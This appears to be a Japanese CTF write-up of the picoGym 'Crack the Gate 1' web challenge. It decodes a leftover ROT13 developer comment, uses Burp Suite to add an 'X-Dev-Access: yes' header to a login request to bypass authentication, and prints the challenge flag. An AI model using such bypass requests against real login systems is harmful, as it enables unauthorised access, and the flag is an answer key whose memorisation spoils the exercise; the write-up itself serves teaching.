---
date: '2025-11-20T14:36:25+09:00'
title: 'PicoGym Crack the Gate 1'
tags: [ "picoGym", "easy", "webExploitation"]
---

## 問題リンク
https://play.picoctf.org/practice/challenge/520

## 概要
ログインフォームが与えられ、「emailは特定したので
侵入してね」というもの

## 予備知識
### HTTPリクエスト

webページでなにかを送受信したりするときは大抵HTTP(HTTPS)
メッセージでやり取りをする。

HTTPメッセージの中でリクエストメッセージのフォーマットは
次の通りになっている

```
POST /login HTTP/1.1 ←リクエストライン
hoge: aaa ←メッセージヘッダーが空行まで続く
fuga: bbb

{"hogehoge": "" ←ここからメッセージボディ
...
}
```

リクエストラインは宛先、メッセージヘッダーはメタ情報、
メッセージボディは送りたいもの本体みたいなイメージ

### burpsuite

ブラウザからHTTPリクエストを送る時に、「送る前に一旦
内部で止めて書き換えてから送る」を可能にするソフト

## 解き方

「開発者が秘密裏に取り残した」とか書いてあるので、
ブラウザのDeveloperツールでコードを見てみると

```
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

というコメント文があることに気づく

base64ではなさそうなのでROT13を試すと
```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes
```

という文字列に復号できた

ここでheaderに"X-Dev-Access: yes"を追加すればいいとわかるので、

burpsuiteを起動→burpsuiteのproxyタブからburpsuiteブラウザ起動→
競技サイトを開く

をして、interceptをオンにする

その後、テキトーにログインフォームを入れてsubmitすると
burpsuite上でリクエストメッセージが編集できる

以下のように`X-Dev-Access: yes`をメッセージヘッダーに追記して
forwardするとフラグが得られる
```
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:50726
Content-Length: 52
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:50726
Referer: http://amiable-citadel.picoctf.net:50726/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
X-Dev-Access: yes

{"email":"ctf-player@picoctf.org","password":"hoge"}
```

成功すると"login successful!"の文字とともにアラートでフラグがもらえる

`picoCTF{brut4_f0rc4_49d1d186}`

### 注:curlでX-Dev-Accessだけ投げても解けない
curlコマンドで
```
curl -X POST \
-H "X-Dev-Access: yes" \
-d '{"email":"ctf-player@picoctf.org", "password": "hoge"}' \
http://amiable-citadel.picoctf.net:54051/login
```

とするだけだと他のヘッダーが異なるので弾かれてしまう
